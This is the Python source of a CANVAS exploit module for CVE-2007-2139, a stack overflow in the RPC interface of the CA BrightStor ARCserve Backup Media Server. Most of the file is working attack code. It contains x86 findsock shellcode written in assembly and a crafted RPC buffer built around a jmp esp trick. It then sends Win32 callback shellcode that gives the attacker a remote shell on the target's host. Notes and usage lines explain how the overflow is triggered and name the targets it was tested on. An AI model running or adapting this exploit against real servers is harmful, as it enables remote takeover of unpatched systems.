#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='CA BrightStor ARCserve Backup Media Server RPC Interface Overflow'
DESCRIPTION='CA BrightStor ARCserve Backup Media Server RPC Interface Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Computer Associates"
DOCUMENTATION['Date public']='04/25/07'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-022.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-2139'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2139'
DOCUMENTATION['CVSS'] = 10.0


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']

NOTES="""
Set port to 0 if you want it to be automatically found by SunRPC port mapper.

Due to the fancyness of the bug, it is possible to write some bytes in memory before getting
control of the execution flow, so we just put a 'jmp esp' in a writeable location and jump to
this location. Technically speaking, we overwrite function arguments that are pointers that
will receive the result of atoi() calls carried on elements of our buffer: we control the
pointers, we control the buffer, thus we can write bytes anywhere in memory

On r9, the vulnerable function has 3 arguments and does 2 atoi() calls.
On r11, the vulnerable function has 4 arguments and does 3 atoi() calls.
The buffer we build combines both so that one request will work against r9 and r11 version of BAB.
Due to the limited amount of space we have, we split the shellcode in 2 parts.

Tested on:
CA BrightStor ARCserve Backup Media Server r11.0 on Windows 2000 Professional SP4 English OOTB
CA BrightStor ARCserve Backup Media Server r11.5SP2 on Windows 2000 Professional SP4 English OOTB
CA BrightStor ARCserve Backup Media Server r9.0 on Windows 2000 Advanced Server SP4 Japanese UP2DATE

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/brightstor_media/brightstor_media.py -v 0 -t 10.10.11.136 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['CA BrightStor ARCserve Backup Media Server r9.0, r11.0, r11.1 and r11.5 on Windows',0x1005dff0], #writeable address
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.port=0
        self.badstring='\0'
        self.subesp=1000
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return 
    
    def test(self):
        self.getArgs()
        try:
            rpcd=self.engine.getModuleExploit('rpcdump')
            rpcd.link(self)
            rpcd.setPort(111)
            rpcd.run()
            for (programnumber,programname,version,proto,port) in rpcd.resultList:
                print programnumber,version,proto
                if programnumber==395646 and version==1 and proto=='tcp':
                    self.port=port
                    self.version=1
                    return 1
        except:
            pass
        return 0

    def createFindsockShellcode(self):
        part1="""xorl   %eax,%eax
movb   $0x8,%ah
subl   %eax,%esp
cld
xorl   %edi,%edi
movl   %fs:0x30(%edi),%eax
movl   0xc(%eax),%eax
movl   0x1c(%eax),%ebx
searchWS2_32:
movl   (%ebx),%ebx
movl   0x20(%ebx),%esi
lodsl
lodsl
decl   %esi
addl   (%esi),%eax
cmpw   $0x3332,%ax
jne    searchWS2_32
shr    $0x10,%eax
decl   %eax
cmpw   $0x325e,%ax
jne    searchWS2_32
movl   0x8(%ebx),%ebp
movl   0x3c(%ebp),%eax
"""
        part1=mosdef.assemble(part1,'x86')
        print '%02x'%(len(part1))
        part2="""movl   0x78(%ebp,%eax,1),%ecx
movl   0x1c(%ebp,%ecx,1),%ecx
movl   0x3c(%ecx,%ebp,1),%ebx
addl   %ebp,%ebx
addl   0x24(%ecx,%ebp,1),%ebp
pushl  %edi
searchSocket:
incw   %di
movl   %esp,%esi
pushl  %esi
pushl  $0x4004667f
pushl  %edi
call  *%ebp
lodsl
test   %eax,%eax
je     searchSocket
cltd
pushl  %edx
movb   $0xc,%dh
pushl  %edx
pushl  %esi
pushl  %edi
call  *%ebx
lodsl
cmpl   $0x2a2a2a2a,%eax
jne    searchSocket
jmp   *%esi"""
        part2=mosdef.assemble(part2,'x86')
        print '%02x'%(len(part2))
        #sys.exit(0)
        return (part1,part2)

    def createShellcode(self):
        self.log('Creating Win32 shellcode (Callback: %s:%d)'%(self.callback.ip,self.callback.port))
        self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))

        self.setProgress(20)
        if self.port==0:
            self.test()
            if self.port==0:
                self.log('Media Server RPC service not found')
                return 0
        if self.version==0:
            self.log('Autoversioning not available')
            return 0
        self.info,self.writeable=targets[self.version]
        findsockcode=self.createFindsockShellcode()

        self.setProgress(40)

        part1=''
        part1+=findsockcode[0]
        part1+='\xeb\x06' #jmp to jmp to part2 for r9, or into part2 (past the nopes) for r11
        part1='A'*(0x40-len(part1))+part1

        part2=''
        part2+='\x90'*0x06
        part2+=findsockcode[1]
        part2+='B'*(0x40-len(part2))

        data='' #epic lulz buffer to come
        data+='_'
        data+='%d'%(0xe4ff) #jmp esp
        data+='_'
        data+=part1
        data+=struct.pack('<L',self.writeable) #eip for r9
        data+='\xeb\xba' #arg_0, esp points here  - jmp to part1
        data+='\xeb\x09' #                          jmp to part2
        data+=struct.pack('<L',self.writeable) #arg_4
        data+=struct.pack('<L',self.writeable+4) #arg_8
        data+='_'
        data+=part2
        data+=struct.pack('<L',self.writeable) #eip for r11
        data+='\xeb\x0e' #arg_0, esp points here
        data+='DD'
        data+=struct.pack('<L',self.writeable) #arg_4
        data+=struct.pack('<L',self.writeable+4) #arg_8
        data+=struct.pack('<L',self.writeable+8) #arg_C
        data+=mosdef.assemble('jmp $-%d'%(0x80+5*4+5),'x86')
        data+='_'

        request=''
        request+=struct.pack('>LLLL',0x80000144,0x0f8b9fdb,0,2)
        request+=struct.pack('>LLLL',395646,1,0xe8,0)
        request+=struct.pack('>LLLL',0,0,0,1)
        request+=struct.pack('>LLLL',2,3,4,len(data))
        request+=data
        while (len(request)%4)!=0:
            request+='\0'
        request+=struct.pack('>L',0xffffffff)

        self.setProgress(60)
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        self.websend(s,request)

        self.setProgress(80)
        self.websend(s,'****'+self.shellcode)
        time.sleep(3)

        self.setProgress(100)
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS '+NAME+' version '+VERSION
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
